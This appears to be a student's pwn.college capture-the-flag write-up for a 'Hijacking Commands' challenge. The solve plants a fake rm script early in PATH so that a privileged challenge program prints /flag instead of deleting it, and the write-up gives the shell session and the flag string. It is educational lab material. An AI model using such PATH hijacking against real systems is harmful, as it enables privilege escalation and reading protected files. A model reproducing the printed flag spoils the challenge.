# Pondering Path

## Hijacking Commands

Armed with your knowledge, you can now carry out some shenanigans. This challenge is almost the same as the first challenge in this module. Again, this challenge will delete the flag using the rm command. But unlike before, it will not print anything out for you.

How can you solve this? You know that rm is searched for in the directories listed in the PATH variable. You have experience creating the win command when the previous challenge needed it. What else can you create?

### Solve
**Flag:** pwn.college{cxNAQaJ3RW_IFdt-uNgJL9vr8bG.QX3cjM1wiNxIzNzEzW}

for changing rm command first create bin directory in /home/hacker directory then create rm shell and then run flag file if -r /flag then read flag into FLAG and echo it. Then change execution access of rm and run it using 
PATH=/home/hacker/bin /challenge/run. It will try to remove the flag but end up giving the flag as we have changed the instructions to rm command thus hacking it 
```bash
hacker@path~hijacking-commands:~$ mkdir -p /home/hacker/bin
hacker@path~hijacking-commands:~$ cat > /home/hacker/bin/rm <<'EOF'
#!/bin/bash
if [ -r /flag ]; then
  read -r FLAG < /flag
  printf '%s\n' "$FLAG"
else
  for f in "$@"; do
    printf '(no /flag; argument: %s)\n' "$f" >&2
  done
fi
exit 0
EOF
hacker@path~hijacking-commands:~$ chmod +x /home/hacker/bin/rm
hacker@path~hijacking-commands:~$ PATH=/home/hacker/bin /challenge/run
Trying to remove /flag...
pwn.college{cxNAQaJ3RW_IFdt-uNgJL9vr8bG.QX3cjM1wiNxIzNzEzW}
```

### New Learnings
We can change the operation of command by creating a duplicate shell of the same then executing the shell as command thus getting desired output

### References 
N.A.
